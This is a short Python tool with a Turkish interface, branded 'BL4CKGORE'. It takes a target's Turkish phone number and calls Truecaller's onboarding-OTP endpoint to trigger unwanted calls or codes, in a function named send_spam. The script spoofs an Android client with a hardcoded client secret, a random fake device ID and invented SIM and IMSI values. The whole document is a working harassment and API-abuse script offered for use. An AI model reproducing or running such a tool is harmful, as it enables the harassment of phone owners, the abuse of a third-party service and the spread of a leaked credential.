import requests
import random
import hashlib
import time
import os

asa = '123456789'
gigk = ''.join(random.choice(asa) for i in range(10))
md5 = hashlib.md5(gigk.encode()).hexdigest()[:16]


clientsecret = 'lvc22mp3l1sfv6ujg83rd17btt'
user_agent = 'Truecaller/12.34.8 (Android;8.1.2)'
accept_encoding = 'gzip'
content_length = '680'
content_type = 'application/json; charset=UTF-8'
Host = 'account-asia-south1.truecaller.com'
headers = {
    'clientsecret': clientsecret,
    'user-agent': user_agent,
    'accept-encoding': accept_encoding,
    'content-length': content_length,
    'content-type': content_type,
    'Host': Host
}

url = 'https://account-asia-south1.truecaller.com/v3/sendOnboardingOtp'

def send_spam(phone_number):
    data = ('{"countryCode":"eg","dialingCode":20,"installationDetails":{"app":{"buildVersion":8,"majorVersion":12,'
            '"minorVersion":34,"store":"GOOGLE_PLAY"},"device":{"deviceId":"' + md5 + '","language":"ar",'
            '"manufacturer":"Xiaomi","mobileServices":["GMS"],"model":"Redmi Note 8A Prime","osName":"Android",'
            '"osVersion":"7.1.2","simSerials":["8920022021714943876f","8920022022805258505f"]},"language":"ar",'
            '"sims":[{"imsi":"602022207634386","mcc":"602","mnc":"2","operator":"vodafone"},{"imsi":"602023133590849",'
            '"mcc":"602","mnc":"2","operator":"vodafone"}],"storeVersion":{"buildVersion":8,"majorVersion":12,'
            '"minorVersion":34}},"phoneNumber":"' + phone_number + '","region":"region-2","sequenceNo":1}')
    response = requests.post(url, headers=headers, data=data)
    if response.status_code == 200:
        print('İşlem Tamamlandı.')
    else:
        print('Arama gönderilemedi.')

def clear_screen():
    os.system('clear')

def print_banner():
    print("""
##############################################
#                                            #
#       👁️ BL4CKGORE ARAMA GÖNDERME 👁️      #
#                                            #
##############################################
""")

def main():
    clear_screen()
    print_banner()
    raw_phone_number = input("Telefon numarasını başında 0 olmadan girin (örn: 5555555555): ")


    if len(raw_phone_number) == 10 and raw_phone_number.isdigit():
        phone_number = "+90" + raw_phone_number
        send_spam(phone_number)
    else:
        print("Geçersiz numara! Lütfen 10 haneli bir telefon numarası girin.")

    time.sleep(2)

if __name__ == "__main__":
    main()

